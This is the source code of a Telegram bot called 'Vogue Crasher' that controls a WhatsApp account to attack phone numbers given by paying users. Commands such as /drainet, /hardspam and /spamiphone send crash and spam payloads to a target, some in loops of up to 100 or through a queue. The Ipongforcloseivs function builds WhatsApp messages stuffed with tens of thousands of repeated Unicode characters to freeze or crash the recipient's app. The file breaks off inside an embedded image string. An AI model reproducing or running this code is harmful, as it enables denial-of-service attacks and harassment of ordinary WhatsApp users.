        
        try {
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                msg.message_id,
                undefined,
                `\`\`\`ruby
V O G U E  •  S Y S T E M
──────────────────────────

RESTART OPERATION

Status      : Complete
Engine      : Online
Process     : Runtime Recovered

──────────────────────────
The bot system has been
successfully restarted.
\`\`\``,
                {
                    parse_mode: "markdown"
                }
            );
            
        } catch {}
        
        process.exit(1);
        
    }, 3000);
    
});

bot.command('killsession', async (ctx) => {
    
    if (ctx.from.id != ownerID) {
        return ctx.reply(
            `Access Denied

This command is restricted to the system owner.`
        );
    }
    
    const msg = await ctx.reply(
        `\`\`\`ruby
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Processing
Engine      : Active
Action      : Removing Auth Session

──────────────────────────
The system is currently deleting all active WhatsApp session data.
\`\`\``,
        {
            parse_mode: "markdown"
        }
    );
    
    try {
        
        if (sock) {
            try {
                await sock.logout();
            } catch {}
        }
        
        const sessionPath = "./session";
        
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, {
                recursive: true,
                force: true
            });
        }
        
        isWhatsAppConnected = false;
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `\`\`\`ruby
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Complete
Engine      : Offline
Action      : Session Destroyed

──────────────────────────
All WhatsApp session files have
been successfully removed.

Re-pairing is required before
the sender can reconnect.
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
        
        console.log(
            `[VOGUE CRASHER] Session terminated successfully`
        );
        
    } catch (error) {
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `\`\`\`ruby
V O G U E  •  S E S S I O N
──────────────────────────

SESSION TERMINATION

Status      : Failed
Engine      : Error
Action      : Abort Operation

──────────────────────────
The system failed to remove
the current session data.
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
        
        console.log(
            `[VOGUE CRASHER] Session termination failed`
        );
        
    }
    
});

bot.command("info", async (ctx) => {
    
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);
    
    const uptime = process.uptime();
    
    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;
    
    const cpuModel = os.cpus()[0].model;
    const cpuCores = os.cpus().length;
    const cpuArch = os.arch();
    const cpuLoad = os.loadavg()[0].toFixed(2);
    
    const platform = os.platform();
    const hostname = os.hostname();
    
    const senderStatus =
        isWhatsAppConnected ?
        "Connected" :
        "Disconnected";
    
    const currentTime = moment()
        .tz("Asia/Jakarta")
        .format("DD/MM/YYYY HH:mm:ss");
    
    const pages = [
        
        `\`\`\`ruby
┏━ V O G U E • I N F O ━┓

⌬ BOT INFORMATION

› Bot Name
  Vogue Crasher

› Version
  1.2 Stable

› Developer
  @PrinceXVogue

› Runtime
  ${runtime}

› Status
  Active and Operational

› Process ID
  ${process.pid}

› NodeJS Version
  ${process.version}

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ W H A T S A P P ━┓

⌬ CONNECTION INFORMATION

› Sender Status
  ${senderStatus}

› Connection Mode
  Single Device

› Current Time
  ${currentTime} WIB

› Platform
  Telegram x WhatsApp Bridge

› Service State
  Stable Connection

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ V P S • I N F O ━┓

⌬ SERVER INFORMATION

› Hostname
  ${hostname}

› Platform
  ${platform}

› Architecture
  ${cpuArch}

› CPU Model
  ${cpuModel}

› CPU Cores
  ${cpuCores} Cores

› CPU Load
  ${cpuLoad}

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ R A M • U S A G E ━┓

⌬ MEMORY INFORMATION

› Total RAM
  ${totalRam} GB

› Used RAM
  ${usedRam} GB

› Free RAM
  ${freeRam} GB

› Memory Usage
  ${(
      (usedRam / totalRam) * 100
  ).toFixed(1)}%

────────────────────────

System operating normally
without critical exception
or service failure.

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``
        
    ];
    
    let currentPage = 0;
    
    const keyboard = (page) => ({
        inline_keyboard: [
            [
            {
                text: "◀ Back",
                callback_data: `info_back_${page}`
            },
            {
                text: `${page + 1}/${pages.length}`,
                callback_data: "info_page"
            },
            {
                text: "Next ▶",
                callback_data: `info_next_${page}`
            }]
        ]
    });
    
    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: pages[currentPage],
        parse_mode: "markdown",
        reply_markup: keyboard(currentPage)
    });
    
});

bot.on("callback_query", async (ctx) => {
    
    const data = ctx.callbackQuery.data;
    
    if (!data.startsWith("info_")) return;
    
    const totalPages = 4;
    
    let page = parseInt(data.split("_")[2]);
    
    if (data.startsWith("info_next")) {
        page = (page + 1) % totalPages;
    }
    
    if (data.startsWith("info_back")) {
        page = (page - 1 + totalPages) % totalPages;
    }
    
    const os = require("os");
    const moment = require("moment-timezone");
    
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);
    
    const uptime = process.uptime();
    
    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    
    const runtime =
        `${days}d ${hours}h ${minutes}m ${seconds}s`;
    
    const cpuModel = os.cpus()[0].model;
    const cpuCores = os.cpus().length;
    const cpuArch = os.arch();
    const cpuLoad = os.loadavg()[0].toFixed(2);
    
    const platform = os.platform();
    const hostname = os.hostname();
    
    const senderStatus =
        isWhatsAppConnected ?
        "Connected" :
        "Disconnected";
    
    const currentTime = moment()
        .tz("Asia/Jakarta")
        .format("DD/MM/YYYY HH:mm:ss");
    
    const pages = [
        
        `\`\`\`ruby
┏━ V O G U E • I N F O ━┓

⌬ BOT INFORMATION

› Bot Name
  Vogue Crasher

› Version
  1.2 Stable

› Developer
  @PrinceXVogue

› Runtime
  ${runtime}

› Status
  Active and Operational

› Process ID
  ${process.pid}

› NodeJS Version
  ${process.version}

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ W H A T S A P P ━┓

⌬ CONNECTION INFORMATION

› Sender Status
  ${senderStatus}

› Connection Mode
  Single Device

› Current Time
  ${currentTime} WIB

› Platform
  Telegram x WhatsApp Bridge

› Service State
  Stable Connection

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ V P S • I N F O ━┓

⌬ SERVER INFORMATION

› Hostname
  ${hostname}

› Platform
  ${platform}

› Architecture
  ${cpuArch}

› CPU Model
  ${cpuModel}

› CPU Cores
  ${cpuCores} Cores

› CPU Load
  ${cpuLoad}

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        
        `\`\`\`ruby
┏━ R A M • U S A G E ━┓

⌬ MEMORY INFORMATION

› Total RAM
  ${totalRam} GB

› Used RAM
  ${usedRam} GB

› Free RAM
  ${freeRam} GB

› Memory Usage
  ${(
      (usedRam / totalRam) * 100
  ).toFixed(1)}%

────────────────────────

System operating normally
without critical exception
or service failure.

┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``
        
    ];
    
    const keyboard = {
        inline_keyboard: [
            [
            {
                text: "◀ Back",
                callback_data: `info_back_${page}`
            },
            {
                text: `${page + 1}/${pages.length}`,
                callback_data: "info_page"
            },
            {
                text: "Next ▶",
                callback_data: `info_next_${page}`
            }]
        ]
    };
    
    try {
        
        await ctx.editMessageCaption(
            pages[page],
            {
                parse_mode: "markdown",
                reply_markup: keyboard
            }
        );
        
        await ctx.answerCbQuery();
        
    } catch (e) {}
    
});

bot.command('ping', async (ctx) => {
    
    const start = Date.now();
    
    const msg = await ctx.reply(
        `\`\`\`ruby
V O G U E  •  N E T W O R K
──────────────────────────

LATENCY SCAN

Status      : Scanning
Host        : Telegram API
Engine      : Measuring Response

──────────────────────────
Please wait while the system
analyzes network latency.
\`\`\``,
        {
            parse_mode: "markdown"
        }
    );
    
    setTimeout(async () => {
        
        const ping = Date.now() - start;
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `\`\`\`ruby
V O G U E  •  N E T W O R K
──────────────────────────

LATENCY SCAN

Status      : Complete
Response    : ${ping} ms
Connection  : Stable

──────────────────────────
System response time has
been successfully analyzed.
\`\`\``,
            {
                parse_mode: "markdown"
            }
        );
        
    }, 2000);
    
});


//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//

bot.command('drainet', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
    
    let q = ctx.message?.text?.split(" ")[1];
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/drainet <target_number>

Example:
/drainet 628xxxxxxxx`
    );
    
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Status      : Success

──────────────────────────
\`\`\``,
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Check Target",
                        url: `https://wa.me/${q}`,
                        style: "primary"
                    }]
                ]
            }
        });
        
        (async () => {
            
            const instanceId = Date.now() + Math.random();
            
            for (let i = 0; i < 1; i++) {
                try {
                    await VogueBuldo(sock, target);
                    await sleep(1500)
                } catch (e) {
                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                    
                }
            }
            
            console.log(`[WORKER ${instanceId}] Done for ${q}`);
            
        })();
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
    }
});

bot.command('hardspam', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
        let q =
            ctx.message?.text
            ?.split(" ")[1];

        if (!q) {

            return ctx.reply(
`Invalid Format

Usage:
/hardspam <target_number>

Example:
/hardspam 628xxxxxxxx`
            );
        }

        let clean =
            q.replace(
                /[^0-9]/g,
                ""
            );

        let target =
            clean +
            "@s.whatsapp.net";

        try {

            addQueue({
                id: Date.now(),
                target,
                number: clean,
                createdAt: Date.now()
            });
            
            const queuePos =
                spamQueue.length;
            
            const TASK_DURATION =
                (30 * 3000) +
                (3 * 60 * 1000);
            
            const estimatedMs =
                (queuePos - 1) *
                TASK_DURATION;
            
            const nextQueueTime =
                moment(
                    Date.now() + estimatedMs
                )
                .tz("Asia/Jakarta")
                .format("HH:mm:ss");
                
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption:
    `\`\`\`ruby
V O G U E • C R A S H E R
────────────────────────

QUEUE STATUS

Target    : ${clean}
Loop      : 30
Queue     : #${queuePos}
Next Run  : ${nextQueueTime} WIB
State     : Added To Queue
────────────────────────
\`\`\``,
                    parse_mode:
                        "Markdown",

                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text:
                                        "Check Target",

                                    url:
`https://wa.me/${clean}`
                                }
                            ]
                        ]
                    }
                }
            );

            processSpamQueue();

        } catch (error) {

            ctx.reply(
`Operation Failed

The system was unable to execute the requested module.`
            );

            console.log(
                `[VOGUE] ${error.message}`
            );

            await restartBot(
                "Connection Closed"
            );
        }
    });

bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
    
    let q = ctx.message?.text?.split(" ")[1];
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/spamandro <target_number>

Example:
/spamandro 628xxxxxxxx`
    );
    
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Status      : Success

──────────────────────────
\`\`\``,
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Check Target",
                        url: `https://wa.me/${q}`,
                        style: "primary"
                    }]
                ]
            }
        });
        
        (async () => {
            
            const instanceId = Date.now() + Math.random();
            
            for (let i = 0; i < 1; i++) {
                try {
                    await VogueSpamInvis(sock, target);
                    await sleep(1500)
                } catch (e) {
                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                    await restartBot("Connection Closed");
                }
            }
            
            console.log(`[WORKER ${instanceId}] Done for ${q}`);
            
        })();
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
        await restartBot("Connection Closed");
    }
});

bot.command('zzz', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
    
    let args = ctx.message?.text?.split(" ");
    
    let q = args[1];
    
    let executionCount = parseInt(args[2]) || 1;
    
    if (executionCount > 100) executionCount = 100;
    
    if (!q) return ctx.reply(
`Invalid Format

Usage:
/hardspam <target_number> <amount>

Example:
/hardspam 628xxxxxxxx 50`
    );
    
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Execution   : ${executionCount}x
Status      : Active

──────────────────────────
Dispatch engine initialized.
\`\`\``,
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: [[{
                    text: "Check Target",
                    url: `https://wa.me/${q}`
                }]]
            }
        });
        
        (async () => {
            
            const instanceBase = Date.now();
            const totalInstances = executionCount;
            
            const createInstance = async (instanceIndex) => {
                
                const instanceId = `${instanceBase}-${instanceIndex}`;
                
                try {
    
                    for (let i = 0; i < 2; i++) {
                        
                        try {
                            
                            if (!sock || !sock.ws || sock.ws.readyState !== 1) {
                                console.log(`[INSTANCE ${instanceId}] WS not ready, waiting reconnect...`);
                                
                                await new Promise(res => setTimeout(res, 5000));
                                
                                if (!sock || !sock.ws || sock.ws.readyState !== 1) {
                                    console.log(`[INSTANCE ${instanceId}] PAUSED (WS disconnected)`);
                                    return; // lebih aman dari break
                                }
                            }
                            
                            await P7X(sock, target);
                            
                            await new Promise(res => setTimeout(res, 3500));
                            
                            console.log(`[INSTANCE ${instanceId}] Exec ${i + 1}`);
                            
                        } catch (e) {
                            console.log(`[INSTANCE ${instanceId}] Error: ${e.message}`);
                            
                            await new Promise(res => setTimeout(res, 2000));
                        }
                    }
                    
                    console.log(`[INSTANCE ${instanceId}] DONE`);
                    
                } catch (err) {
                    console.log(`[INSTANCE ${instanceId}] FAILED: ${err.message}`);
                }
            };
            
            // LIMIT PARALLEL EXECUTION (INI YANG PENTING)
            const chunkSize = 5;
            
            for (let i = 0; i < totalInstances; i += chunkSize) {
                
                const chunk = Array.from(
                    { length: Math.min(chunkSize, totalInstances - i) },
                    (_, j) => createInstance(i + j + 1)
                );
                
                await Promise.allSettled(chunk);
                
                await new Promise(res => setTimeout(res, 4000));
            }
            
            console.log(`[SYSTEM] All ${totalInstances} instances completed`);
            
        })();
        
    } catch (error) {
        
        ctx.reply(`Operation Failed\n\nSystem unable to execute module.`);
        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
    }
});

bot.command('spamiphone', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, CheckCooldown, async (ctx) => {
    
    let q = ctx.message?.text?.split(" ")[1];
    
    if (!q) return ctx.reply(
        `Invalid Format

Usage:
/spamiphone <target_number>

Example:
/spamiphone 628xxxxxxxx`
    );
    
    let target =
        q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    try {
        
        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

EXECUTION STATUS

Target      : ${q}
Status      : Success

──────────────────────────
\`\`\``,
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                    {
                        text: "Check Target",
                        url: `https://wa.me/${q}`,
                        style: "primary"
                    }]
                ]
            }
        });
        
        setImmediate(async () => {
            const instanceId = Date.now() + Math.random();
            for (let i = 0; i < 100; i++) {
                
                try {
                    if (!sock) {
                        throw new Error("WhatsApp socket unavailable");
                    }
                    await Ipongforcloseivs(sock, target);
                } catch (e) {
                    console.log(
                        `[VOGUE CRASHER] Dispatch Error: ${e.message}`
                    );
                    await restartBot("Connection Closed");
                }
                
                await sleep(1500);
            }
            
            console.log(
                `[VOGUE CRASHER] Execution completed successfully for ${q}`
            );
            
        });
        
    } catch (error) {
        
        ctx.reply(
            `Operation Failed

The system was unable to execute the requested module.
Please verify the target input and system status before retrying.`
        );
        
        console.log(
            `[VOGUE CRASHER] Execution failed for ${q}`
        );
        await restartBot("Connection Closed");
    }
});

//    ______ _   _ _   _ _____ _____ _____ _____ _   _ 
//    |  ___| | | | \ | /  __ \_   _|_   _|  _  | \ | |
//    | |_  | | | |  \| | /  \/ | |   | | | | | |  \| |
//    |  _| | | | | . ` | |     | |   | | | | | | . ` |
//    | |   | |_| | |\  | \__/\ | |  _| |_\ \_/ / |\  |
//    \_|    \___/\_| \_/\____/ \_/  \___/ \___/\_| \_/
//                                                     
//                                                     
//    ______ _   _ _____                               
//    | ___ \ | | |  __ \                              
//    | |_/ / | | | |  \/                              
//    | ___ \ | | | | __                               
//    | |_/ / |_| | |_\ \                              
//    \____/ \___/ \____/                              
//                                                     
//

function loadQueue() {

    try {

        if (!fs.existsSync(queueFile)) {
            fs.writeFileSync(
                queueFile,
                JSON.stringify([], null, 2)
            );
        }

        const data =
            fs.readFileSync(queueFile);

        spamQueue =
            JSON.parse(data);

    } catch {

        spamQueue = [];
    }
}

function saveQueue() {

    fs.writeFileSync(
        queueFile,
        JSON.stringify(
            spamQueue,
            null,
            2
        )
    );
}

function addQueue(data) {

    spamQueue.push(data);

    saveQueue();
}

function removeFirstQueue() {

    spamQueue.shift();

    saveQueue();
}

async function restoreQueue() {

    loadQueue();

    if (!spamQueue.length) {

        console.log(
            "[QUEUE] No pending tasks"
        );

        return;
    }

    console.log(
        `[QUEUE] Restoring ${spamQueue.length} task(s) in 30 seconds`
    );

    await sleep(30000);

    processSpamQueue();
}

async function processSpamQueue() {
    
    if (queueRunning) return;
    
    queueRunning = true;
    
    while (spamQueue.length > 0) {
        
        const job = spamQueue[0];
        
        const {
            target,
            number
        } = job;
        
        const queueNumber =
            job.id;
        
        const instanceId =
            Date.now() + Math.random();
        
        console.log(
            `[QUEUE ID ${queueNumber}] Starting ${number}`
        );
        
        try {
            
            for (let i = 0; i < 30; i++) {
                
                try {
                    
                    await VogueSpamInvis(
                        sock,
                        target
                    );
                    
                    console.log(
                        `[QUEUE #${queueNumber}] [WORKER ${instanceId}] Loop ${i + 1}/30`
                    );
                    
                    await sleep(3000);
                    
                } catch (e) {
                    
                    console.log(
                        `[QUEUE #${queueNumber}] [WORKER ${instanceId}] ${e.message}`
                    );
                    
                    await restartBot(
                        "Connection Closed"
                    );
                    
                    break;
                }
            }
            
            console.log(
                `[QUEUE #${queueNumber}] Finished ${number}`
            );
            
            try {
                
                await bot.telegram.sendMessage(
                    LOG_QUEUE_CHANNEL_ID,
                    `\`\`\`ruby
QUEUE COMPLETED

Queue ID : #${queueNumber}
Loop     : 30
Status   : Finished
Engine   : Vogue Queue System
\`\`\``,
                    {
                        parse_mode: "Markdown"
                    }
                );
                
            } catch (e) {
                
                console.log(
                    `[LOG ERROR] ${e.message}`
                );
            }
            
            removeFirstQueue();
            
            if (spamQueue.length > 0) {
                
                console.log(
                    `[QUEUE] Waiting 3 minutes before next task`
                );
                
                await sleep(
                    3 * 60 * 1000
                );
            }
            
        } catch (err) {
            
            console.log(
                `[QUEUE ERROR] ${err.message}`
            );
            
            removeFirstQueue();
        }
    }
    
    queueRunning = false;
}

async function restartBot(reason = "Unknown") {

    console.log(`
[VOGUE AUTO RESTART]

Reason : ${reason}
`);

    try {
        await destroySocket();
    } catch {}

    setTimeout(() => {
        process.exit(1);
    }, 2000);
}

async function CheckCooldown(ctx, next) {
    
    if (
        String(ctx.from.id) ===
        String(ownerID)
    ) {
        return next();
    }
    
    
    if (globalCooldown <= 0) {
        return next();
    }
    
    const command =
        ctx.update.message.text
        ?.split(" ")[0]
        ?.replace("/", "") || "unknown";
    
    const userId =
        String(ctx.from.id);
    
    const key =
        `${userId}:${command}`;
    
    const now =
        Date.now();
        
    const expires =
        cooldown.get(key);
    
    if (
        expires &&
        now < expires
    ) {
        
        const remaining =
            Math.ceil(
                (expires - now) / 1000
            );
        
        return ctx.reply(
            `\`\`\`ruby
GLOBAL COOLDOWN

Command  : ${command}
Remaining: ${remaining}s
Status   : Cooldown Active
\`\`\``,
            {
                parse_mode: "Markdown"
            }
        );
    }
    
    cooldown.set(
        key,
        now + (
            globalCooldown * 1000
        )
    );
    
    setTimeout(() => {
        cooldown.delete(key);
    }, globalCooldown * 1000);
    
    return next();
}

async function Ipongforcloseivs(sock, target) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessagex = {
            degreesLatitude: 11.11,
            degreesLongitude: -11.11,
            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/elyssavirellequeenn",
        }
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessagex
                }
            }
        }, {});
        let extendMsgx = {
            extendedTextMessage: {
                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                matchedText: "helow",
                description: "𑇂𑆵𑆴𑆿".repeat(60000),
                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                previewType: "NONE",
                jpegThumbnail: "",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msgx2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsgx
                }
            }
        }, {});
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        let extendMsg = {
            extendedTextMessage: {
                text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone,
                matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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